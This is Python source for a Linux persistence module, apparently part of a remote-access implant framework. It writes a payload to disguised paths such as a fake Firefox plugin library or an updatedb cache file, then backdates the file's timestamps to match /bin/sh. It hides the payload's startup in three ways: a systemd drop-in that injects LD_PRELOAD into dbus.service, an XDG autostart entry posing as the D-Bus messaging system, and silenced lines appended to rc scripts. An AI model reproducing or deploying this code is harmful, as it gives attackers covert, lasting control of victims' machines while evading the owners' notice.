# -*- coding: utf-8 -*-

import os
import subprocess
import random
import stat

class DropManager(object):
    def __init__(self):
        self._is_systemd = False
        self._systemd_error = None
        self._is_xdg = False
        self._xdg_error = None
        self._uid = os.getuid()
        self._user = self._uid != 0
        self._home = os.path.expanduser('~')
        self._devnull = open(os.devnull, 'r')
        self._rc = []
        self._rc_error = None

        self._check_xdg()
        self._check_rc()
        self._check_systemd()

    def _find_executable(self, name):
        for path in [
                '/bin',
                '/sbin',
                '/usr/bin',
                '/usr/sbin',
                '/usr/local/bin',
                '/usr/local/sbin',
                '/usr/libexec',
                '/usr/lib',
                '/usr'
        ]:
            for root, dirs, files in os.walk(path):
                for file in files:
                    if file == name:
                        return os.path.join(root, file)


    def _check_xdg(self):
        try:
            self._is_xdg = ( subprocess.check_call(
                ['xdg-open', '--version'],
                stdout=self._devnull,
                stderr=self._devnull
            ) == 0 )

            self._is_xdg = True
        except CalledProcessError as e:
            self._is_xdg = False
            self._xdg_error = str(e)

    def _check_systemd_reval(self, args):
        penv = {
            'stdout': self._devnull,
            'stderr': self._devnull,
        }

        if not os.getenv('DBUS_SESSION_BUS_ADDRESS') and self._user:
            penv.update({
                'env': {
                    'DBUS_SESSION_BUS_ADDRESS':
                    'unix:path=/var/run/user/{}/dbus/user_bus_socket'.format(self._uid)
                },
            })

        try:
            cmd = ['systemctl']
            if self._user:
                cmd.append('--user')

            cmd = cmd + args

            return ( subprocess.check_call(cmd, **penv) == 0 )

        except subprocess.CalledProcessError:
            return None

    def _check_systemd(self):
        if self._user:
            systemd_socket = '/run/user/{}/systemd/private'.format(self._uid)
        else:
            systemd_socket = '/run/systemd/private'

        try:
            if not os.path.exists(systemd_socket) and stat.S_ISSOCK(os.stat(systemd_socket).st_mode):
                self._systemd_error = 'No systemd socket found'
                return
        except OSError as e:
            self._systemd_error = str(e)
            return

        self._is_systemd = self._check_systemd_reval([])
        if not self._is_systemd:
            self._systemd_error = 'Systemd is not available or not working properly'

    def _check_systemd_unit(self, unit):
        return self._check_systemd_reval(['is-enabled', unit])

    def _check_rc(self):
        self._rc = [
            rc for rc in [
                '/etc/init.d/rc.local',
                '/etc/rc',
                '/etc/rc.local',
                '/etc/init.d/dbus'
            ] if os.access(rc, os.W_OK)
        ]
        if len(self._rc) == 0:
            self._rc_error = 'No writable known RC scripts found'

    @property
    def methods(self):
        return {
            'xdg': self._is_xdg or self._xdg_error,
            'systemd': self._is_systemd or self._systemd_error,
            'rc': len(self._rc) > 0 or self._rc_error,
            'user': self._user
        }

    def _find_systemd_system_path(self):
        for d in [ '/lib/systemd/system', '/usr/lib/systemd/system', '/etc/systemd/system' ]:
            if os.path.exists(d):
                return os.path.dirname(d)

    def _get_systemd_unit_path(self, system=True):
        if self._user:
            path = os.path.join(self._home, '.config/systemd/user')
        else:
            path = os.path.join(self._find_systemd_system_path(), 'system' if system else 'user')

        return path

    def _add_systemd_add_to_unit(self, unit, key, value, section='Service', system=True, confname='distlocal.conf'):

        confname = confname or ''.join([
            chr(random.randint(ord('a'), ord('z'))) for _ in xrange(random.randint(5, 10))
        ]) + '.conf'

        unit = os.path.join(self._get_systemd_unit_path(system), unit+'.d', confname)

        if not os.path.isdir(os.path.dirname(unit)):
            os.makedirs(os.path.dirname(unit))

        with open(unit, 'w') as funit:
            funit.write(
                '[{}]\n'
                '{}={}\n'.format(section, key, value)
            )

        return unit

    def _add_loadable_systemd_unit(self, unit, executable, description, service_type='forking'):
        confdir = self._get_systemd_unit_path()
        base_wants = os.path.join(confdir, 'default.target.wants')

        base_wants_unit = os.path.join(base_wants, unit)

        unit = os.path.join(confdir, unit)
        if not os.path.exists(confdir):
            os.makedirs(confdir)

        if not os.path.exists(base_wants):
            os.makedirs(base_wants)

        with open(unit, 'w') as funit:
            funit.write(
                '[Unit]\n'
                'Description={}\n\n'
                '[Service]\n'
                'Type={}\n'
                'ExecStart={}\n'.format(
                    description,
                    service_type,
                    executable
                )
            )

        if os.path.exists(base_wants_unit):
            os.unlink(base_wants_unit)

        os.symlink(unit, base_wants_unit)


    def _drop_file(self, payload):
        rand = ''.join([
            chr(random.randint(ord('a'), ord('z'))) for _ in xrange(random.randint(5, 10))
        ])

        user_targets = [
            '%h/.local/lib/%r.so.1', '%h/.local/bin/%r',
            '%h/.cache/mozilla/firefox/libflushplugin.so',
            '%h/.mozilla/plugins/libflushplugin.so',
        ]

        system_targets = [
            '/lib/lib%r.so.1',
            '/usr/lib/lib%r.so.1',
            '/var/lib/.updatedb.cache.tmp.%r'
        ]

        targets = [
            target.replace(
                '%h', self._home
            ).replace(
                '%r', rand
            ) for target in ( user_targets if self._user else system_targets )
        ]

        shstat = os.stat('/bin/sh')

        for target in targets:
            dropdir = os.path.dirname(target)
            if os.path.isdir(dropdir):
                try:
                    with open(target, 'w') as droppie:
                        droppie.write(payload)

                    os.utime(target, (shstat.st_atime, shstat.st_ctime))
                    return target

                except Exception as e:
                    continue

        for target in targets:
            dropdir = os.path.dirname(target)
            try:
                os.makedirs(dropdir)
                with open(target, 'w') as droppie:
                    droppie.write(payload)

                os.utime(target, (shstat.st_atime, shstat.st_ctime))
                return target

            except Exception:
                continue

    def _is_path_in_file(self, filepath, path):
        if os.path.isfile(filepath):
            with open(filepath, 'r') as file:
                return 'path' in filepath
        return False

    def _add_to_rc(self, path):
        for rc in self._rc:
            if self._is_path_in_file(rc, path):
                return

            rcstat = os.stat(rc)

            with open(rc, 'a') as rcfile:
                rcfile.write(path + '& 2>/dev/null 1>/dev/null')

            os.utime(rc, (rcstat.st_atime, rcstat.st_ctime))
            return rc

    def _add_to_xdg(self, path, confname='dbus'):
        confname = confname or ''.join([
            chr(random.randint(ord('a'), ord('z'))) for _ in xrange(random.randint(5, 10))
        ])

        if self._user:
            xdg = os.getenv('XDG_CONFIG_HOME') or os.path.join(
                self._home, '.config/autostart', confname+'.desktop')
        else:
            xdg = os.getenv('XDG_CONFIG_DIRS') or os.path.join(
                '/etc/xdg/autostart', confname+'.desktop')

        if not os.path.exists(os.path.dirname(xdg)):
            os.makedirs(os.path.dirname(xdg))

        with open(xdg, 'w') as fxdg:
            fxdg.write(
                '[Desktop Entry]\n'
                'Name=DBus\n'
                'GenericName=D-Bus messaging system\n'
                'Exec=/bin/sh -c "{}"\n'
                'Terminal=false\n'
                'Type=Application\n'
                'Categories=System\n'
                'StartupNotify=false\n'.format(path)
            )

        return xdg

    def add_library(self, payload, name=None, system=None):
        if not any([
            self._is_systemd, self._is_xdg, self._rc
        ]):
            return None, None

        dbus_daemon = self._find_executable('dbus-daemon')
        if not dbus_daemon:
            return None, None

        path = self._drop_file(payload)
        if self._is_systemd:
            if not self._check_systemd_unit('dbus.service'):
                self._add_loadable_systemd_unit(
                    'dbus.service',
                    '{} --session'.format(dbus_daemon),
                    'D-Bus session daemon',
                )

            return path, self._add_systemd_add_to_unit(
                'dbus.service',
                'Environment',
                'LD_PRELOAD={}'.format(path),
                section='Service',
                confname=name
            )
        elif self._is_xdg:
            return path, self._add_to_xdg(
                'LD_PRELOAD={} HOOK_EXIT=1 {} --session --fork'.format(path, dbus_daemon)
            )
        elif self._rc:
            return path, self._add_to_rc(
                'LD_PRELOAD={} HOOK_EXIT=1 {} --session --fork'.format(path, dbus_daemon)
            )

    def add_binary(self, payload, name=None, system=None):
        if not any([
            self._is_systemd, self._is_xdg, self._rc
        ]):
            return None, None

        path = self._drop_file(payload)
        if not path:
            return None, None

        os.chmod(path, 0111)

        if self._is_systemd:
            return path, self._add_systemd_add_to_unit(
                'dbus.service',
                'ExecStartPre',
                '-{}'.format(path),
                section='Service',
                confname=name
            )
        elif self._is_xdg:
            return path, self._add_to_xdg(
                '{} & 2>/dev/null 1>/dev/null'.format(path)
            )
        elif self._rc:
            return path, self._add_to_rc(
                '{} & 2>/dev/null 1>/dev/null'.format(path)
            )
